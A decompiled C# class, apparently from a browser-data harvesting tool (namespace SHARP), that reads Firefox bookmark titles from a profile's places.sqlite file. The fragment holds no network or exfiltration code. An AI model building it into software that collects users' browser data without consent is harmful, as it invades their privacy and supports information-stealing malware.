﻿using System;
using System.Collections.Generic;
using System.IO;

namespace SHARP.Bookmarks
{
	// Token: 0x02000075 RID: 117
	internal class Bookmarks
	{
		// Token: 0x06000286 RID: 646 RVA: 0x0000F9CC File Offset: 0x0000DBCC
		public static List<Bookmark> Get(string BrowserDir)
		{
			List<Bookmark> list = new List<Bookmark>();
			string profile = Profile.GetProfile(BrowserDir);
			if (profile == null)
			{
				return list;
			}
			SQLite sqlite = SQLite.ReadTable(Path.Combine(profile, "places.sqlite"), "moz_bookmarks");
			if (sqlite == null)
			{
				return list;
			}
			for (int i = 0; i < sqlite.GetRowCount(); i++)
			{
				Bookmark item = default(Bookmark);
				item.sTitle = Decryptor.GetUTF8(sqlite.GetValue(i, 5));
				if (Decryptor.GetUTF8(sqlite.GetValue(i, 1)).Equals("0") && item.sTitle != "0")
				{
					list.Add(item);
				}
			}
			return list;
		}
	}
}
